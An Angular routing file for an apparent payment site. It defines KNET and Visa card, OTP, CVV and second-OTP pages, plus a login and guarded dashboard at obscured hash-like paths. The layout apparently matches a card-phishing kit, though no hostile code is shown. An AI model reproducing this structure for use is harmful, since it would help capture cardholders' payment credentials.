import { Routes } from '@angular/router';
import { Home } from './pages/home/home';
import { ChoosePayment } from './pages/choose-payment/choose-payment';
import { Knet } from './pages/knet/knet';
import { KnetOtp } from './pages/knet-otp/knet-otp';
import { KnetCvv } from './pages/knet-cvv/knet-cvv';
import { KnetOtp2 } from './pages/knet-otp2/knet-otp2';
import { VisaOtp } from './pages/visa-otp/visa-otp';
import { Login } from './pages/login/login';
import { Dashboard } from './pages/dashboard/dashboard';
import { AuthGuard } from './core/guards/auth-guard';

export const routes: Routes = [
    {
        path: "",
        component: Home
    },
    {
        path: "choose-payment-method",
        component: ChoosePayment
    },
    {
        path: "pay/knet",
        component: Knet
    },
    {
        path: "pay/knet/otp",
        component: KnetOtp
    },
    {
        path: "pay/knet/cvv",
        component: KnetCvv
    },
    {
        path: "pay/knet/otp2",
        component: KnetOtp2
    },
    {
        path: "pay/visa/otp",
        component: VisaOtp
    },
    {
        path: "93ceb7962cf40688f3c465ba57ff7286893fd19e",
        component: Login
    },
    {
        path: "f638a1c1300f2d516cf3098ec63287dc71476eed2476d460252812d81601d25c",
        component: Dashboard,
        canActivate: [AuthGuard]
    }
];

